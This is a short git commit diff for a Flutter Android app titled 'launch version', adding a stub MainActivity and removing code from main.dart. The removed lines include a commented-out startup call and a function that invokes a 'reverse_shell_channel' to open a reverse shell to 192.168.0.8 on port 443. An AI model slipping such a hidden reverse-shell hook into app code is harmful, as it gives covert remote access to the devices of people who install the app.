d01d71a5aabba49a6c646df48f51e6ae00f82246
Daniel Gonzalez <daniel.gonzalezubaque@gmail.com>
2025-09-22 20:23:45 -0500

    launch version

---
+++ android/app/src/main/java/com/dnv/ctos/MainActivity.java
@@ -0,0 +1,5 @@
+package com.dnv.ctos;
+
+import io.flutter.embedding.android.FlutterActivity;
+
+public class MainActivity extends FlutterActivity {}
--- lib/main.dart
+++ lib/main.dart
@@ -17,21 +17,6 @@ class MyApp extends StatefulWidget {
 
 class _MyAppState extends State<MyApp> {
   @override
-  void initState() {
-    //startReverseTCP("192.168.0.8", 443);
-    super.initState();
-  }
-
-  Future<void> startReverseTCP(String ip, int port) async {
-    const MethodChannel channel = MethodChannel('reverse_shell_channel');
-    try {
-      await channel.invokeMethod('startReverseShell', {"ip": ip, "port": port});
-    } catch (e) {
-      print("Error: ${e}");
-    }
-  }
-
-  @override
   Widget build(BuildContext context) {
     return MaterialApp(debugShowCheckedModeBanner: false, home: bootAnimation());
   }
